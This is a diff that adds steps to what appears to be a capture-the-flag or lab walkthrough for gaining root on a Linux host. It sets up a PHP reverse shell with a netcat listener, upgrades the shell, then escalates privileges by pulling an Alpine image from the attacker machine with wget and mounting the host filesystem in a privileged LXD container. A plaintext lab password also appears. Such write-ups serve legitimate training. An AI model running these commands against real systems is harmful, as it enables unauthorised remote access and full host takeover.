@@ -127,6 +127,84 @@ Password: abcd1234
 
 
 
+**Kali**
+
+```
+git clone https://github.com/pentestmonkey/php-reverse-shell.git
+cp php-reverse-shell/php-reverse-shell.php .
+subl php-reverse-shell.php
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+nc -lvnp 1234
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Get autocomplete
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+
+
+**Victim**
+
+```
+id
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+**Kali**
+
+```
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+python2 -m SimpleHTTPServer 81
+```
+
+
+
+**Note:** The command lxd init was to resolve a storage pool area issue, it may not always be needed.
+
+**Victim**
+
+```
+cd /tmp
+wget http://$KALI:81/alpine-v3.13-x86_64-20210218_0139.tar.gz
+lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+lxd init
+lxc image list
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
 
 
 
